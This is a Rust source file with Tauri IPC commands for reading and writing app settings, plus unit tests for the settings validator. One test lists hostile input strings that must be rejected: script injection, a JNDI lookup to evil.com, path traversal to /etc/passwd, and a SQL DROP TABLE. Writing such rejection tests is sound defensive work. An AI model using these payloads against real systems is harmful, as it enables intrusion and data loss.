/// Settings Domain Commands
/// 
/// Handles all settings-related IPC operations with comprehensive security validation.
/// Settings operations require SystemAccess capability and include validation for
/// both keys and values to prevent injection attacks and malicious configuration.

use crate::commands::shared::{
    validate_ipc_operation, validate_setting_secure, CommandPerformanceTracker, log_security_event
};
use crate::error::ApiError;
use crate::validation::OperationCapability;
use crate::AppState;
use std::collections::HashMap;
use tauri::State;

/// Retrieves a single setting value by key
/// 
/// Security features:
/// - IPC operation context validation with SystemAccess capability
/// - Setting key validation (alphanumeric + dots/underscores only)
/// - Frequency limit enforcement (15 operations/minute for IPC)
/// - Performance monitoring (<2ms overhead target)
#[tauri::command]
pub async fn get_setting(
    key: String,
    app_state: State<'_, AppState>,
) -> Result<Option<String>, ApiError> {
    let _tracker = CommandPerformanceTracker::new("get_setting");
    
    // Validate IPC operation with required capabilities
    let _context = validate_ipc_operation(
        &app_state.security_validator,
        vec![OperationCapability::SystemAccess]
    )?;
    
    // Validate setting key format
    validate_setting_secure(&key, "")?; // Empty value for get operations
    
    // Log security event
    log_security_event(
        "SETTING_GET",
        "IPC",
        true,
        &format!("Retrieving setting '{}'", key)
    );
    
    // Retrieve setting from database
    let value = app_state.settings.get_setting(&key).await?;
    
    Ok(value)
}

/// Sets a setting key-value pair with security validation
/// 
/// Security features:
/// - IPC operation context validation with SystemAccess capability
/// - Setting key validation (alphanumeric + dots/underscores only)
/// - Setting value validation (length limits, malicious pattern detection)
/// - Frequency limit enforcement
/// - Performance monitoring
/// - Audit logging for configuration changes
#[tauri::command]
pub async fn set_setting(
    key: String,
    value: String,
    app_state: State<'_, AppState>,
) -> Result<(), ApiError> {
    let _tracker = CommandPerformanceTracker::new("set_setting");
    
    // Validate IPC operation with required capabilities
    let _context = validate_ipc_operation(
        &app_state.security_validator,
        vec![OperationCapability::SystemAccess]
    )?;
    
    // Validate both setting key and value
    validate_setting_secure(&key, &value)?;
    
    // Log security event for configuration change
    log_security_event(
        "SETTING_SET",
        "IPC",
        true,
        &format!("Setting '{}' to value ({} chars)", key, value.len())
    );
    
    // Store setting using settings service
    // Note: The settings service handles JSON serialization internally
    let temp_value = serde_json::json!(value);
    let value_str = temp_value.as_str().unwrap_or(&value);
    
    app_state.settings.set_setting(&key, value_str).await?;
    
    Ok(())
}

/// Retrieves all settings as a key-value map
/// 
/// Security features:
/// - IPC operation context validation with SystemAccess capability
/// - Frequency limit enforcement
/// - Performance monitoring
/// - Audit logging for bulk configuration access
/// - Memory usage consideration for large setting collections
#[tauri::command]
pub async fn get_all_settings(
    app_state: State<'_, AppState>,
) -> Result<HashMap<String, serde_json::Value>, ApiError> {
    let _tracker = CommandPerformanceTracker::new("get_all_settings");
    
    // Validate IPC operation with required capabilities
    let _context = validate_ipc_operation(
        &app_state.security_validator,
        vec![OperationCapability::SystemAccess]
    )?;
    
    // Log security event for bulk settings access
    log_security_event("SETTING_GET_ALL", "IPC", true, "Retrieving all settings");
    
    // Retrieve all settings from database
    let settings = app_state.settings.get_all_settings().await?;
    
    Ok(settings)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::validation::{SecurityValidator, OperationContext, OperationSource};
    use crate::database::DbService;
    use crate::search::SearchService;
    use crate::settings::SettingsService;
    use crate::global_shortcut::GlobalShortcutService;
    use crate::window_manager::WindowManager;
    use crate::plugin::PluginManager;
    use crate::shutdown::ShutdownManager;
    use std::sync::Arc;
    use tempfile::NamedTempFile;
    
    async fn create_test_app_state() -> AppState {
        let temp_file = NamedTempFile::new().unwrap();
        let db_path = temp_file.path().to_string_lossy().to_string();
        
        let db_service = Arc::new(DbService::new(&db_path).unwrap());
        let security_validator = Arc::new(SecurityValidator::new());
        let search_service = Arc::new(SearchService::new(db_service.clone()));
        let settings_service = Arc::new(SettingsService::new(db_service.clone()));
        let plugin_manager = Arc::new(tokio::sync::Mutex::new(PluginManager::new()));
        
        AppState {
            db: db_service,
            search: search_service,
            settings: settings_service.clone(),
            global_shortcut: Arc::new(GlobalShortcutService::new_test(settings_service.clone())),
            window_manager: Arc::new(WindowManager::new_test(settings_service)),
            plugin_manager,
            security_validator,
            shutdown_manager: Arc::new(ShutdownManager::default()),
        }
    }
    
    #[tokio::test]
    async fn test_get_setting_security() {
        let app_state = create_test_app_state().await;
        
        // Test setting key validation directly
        assert!(validate_setting_secure("theme", "").is_ok());
        assert!(validate_setting_secure("", "").is_err());
        assert!(validate_setting_secure("key with spaces", "").is_err());
        assert!(validate_setting_secure("key$pecial", "").is_err());
        
        // Test settings service directly
        let result = app_state.settings.get_setting("theme").await;
        assert!(result.is_ok());
    }
    
    #[tokio::test]
    async fn test_set_setting_security() {
        let app_state = create_test_app_state().await;
        
        // Test setting validation
        assert!(validate_setting_secure("theme", "dark").is_ok());
        assert!(validate_setting_secure("", "value").is_err());
        assert!(validate_setting_secure("key with spaces", "value").is_err());
        assert!(validate_setting_secure("key", "<script>alert('xss')</script>").is_err());
        
        // Test key length limits
        let long_key = "a".repeat(1025);
        assert!(validate_setting_secure(&long_key, "value").is_err());
        
        // Test value length limits
        let long_value = "a".repeat(1025);
        assert!(validate_setting_secure("key", &long_value).is_err());
        
        // Test settings service directly
        let result = app_state.settings.set_setting("theme", "dark").await;
        assert!(result.is_ok());
    }
    
    #[tokio::test]
    async fn test_get_all_settings_security() {
        let app_state = create_test_app_state().await;
        
        // Test settings service directly
        let result = app_state.settings.get_all_settings().await;
        assert!(result.is_ok());
        
        let settings = result.unwrap();
        // Settings map can be empty or have defaults - both are valid
        assert!(settings.is_empty() || !settings.is_empty());
    }
    
    #[tokio::test]
    async fn test_setting_validation_edge_cases() {
        let _app_state = create_test_app_state().await;
        
        // Test valid key formats through validation
        assert!(validate_setting_secure("window.width", "800").is_ok());
        assert!(validate_setting_secure("user_theme", "light").is_ok());
        assert!(validate_setting_secure("auto-save", "true").is_ok());
        assert!(validate_setting_secure("setting123", "value").is_ok());
    }
    
    #[tokio::test]
    async fn test_operation_context_validation() {
        let app_state = create_test_app_state().await;
        
        // Test operation context validation for settings operations
        let system_context = OperationContext::new_direct(vec![OperationCapability::SystemAccess]);
        assert!(app_state.security_validator.validate_operation_context(&system_context).is_ok());
        
        let ipc_context = OperationContext::new_ipc(vec![OperationCapability::SystemAccess]);
        assert!(app_state.security_validator.validate_operation_context(&ipc_context).is_ok());
    }
    
    #[tokio::test]
    async fn test_setting_malicious_content_detection() {
        let _app_state = create_test_app_state().await;
        
        // Test malicious pattern detection in settings values
        let malicious_values = vec![
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "eval('malicious code')",
            "${jndi:ldap://evil.com}",
            "../../../etc/passwd",
            "'; DROP TABLE settings; --",
        ];
        
        for malicious_value in malicious_values {
            let result = validate_setting_secure("key", malicious_value);
            assert!(result.is_err(), "Malicious setting value should be rejected: {}", malicious_value);
        }
    }
    
    #[tokio::test]
    async fn test_setting_key_format_validation() {
        let _app_state = create_test_app_state().await;
        
        // Test valid key formats
        let valid_keys = vec![
            "theme",
            "window.width",
            "user_preference",
            "auto-save",
            "setting123",
            "app.ui.theme",
            "deep.nested.setting.key",
        ];
        
        for key in valid_keys {
            let result = validate_setting_secure(key, "value");
            assert!(result.is_ok(), "Valid key format should be accepted: {}", key);
        }
        
        // Test invalid key formats
        let invalid_keys = vec![
            "",
            "key with spaces",
            "key$pecial",
            "key@domain.com",
            "key/with/slash",
            "key\\with\\backslash",
            "key%encoded",
        ];
        
        for key in invalid_keys {
            let result = validate_setting_secure(key, "value");
            assert!(result.is_err(), "Invalid key format should be rejected: {}", key);
        }
    }
    
    #[tokio::test]
    async fn test_settings_crud_operations() {
        let app_state = create_test_app_state().await;
        
        // Test create/update setting
        let set_result = app_state.settings.set_setting("test_key", "test_value").await;
        assert!(set_result.is_ok());
        
        // Test read setting
        let get_result = app_state.settings.get_setting("test_key").await;
        assert!(get_result.is_ok());
        
        let value = get_result.unwrap();
        assert!(value.is_some());
        assert_eq!(value.unwrap(), "test_value");
        
        // Test read non-existent setting
        let missing_result = app_state.settings.get_setting("non_existent_key").await;
        assert!(missing_result.is_ok());
        assert!(missing_result.unwrap().is_none());
    }
    
    #[tokio::test]
    async fn test_settings_performance() {
        let app_state = create_test_app_state().await;
        
        // Test settings operations performance
        let start = std::time::Instant::now();
        
        // Perform multiple setting operations
        for i in 0..10 {
            let key = format!("test_key_{}", i);
            let value = format!("test_value_{}", i);
            let _ = app_state.settings.set_setting(&key, &value).await;
        }
        
        let duration = start.elapsed();
        assert!(duration.as_millis() < 1000); // Should be fast for small operations
        
        // Test bulk retrieval performance
        let start = std::time::Instant::now();
        let _ = app_state.settings.get_all_settings().await;
        let duration = start.elapsed();
        assert!(duration.as_millis() < 100); // Should be very fast for small dataset
    }
}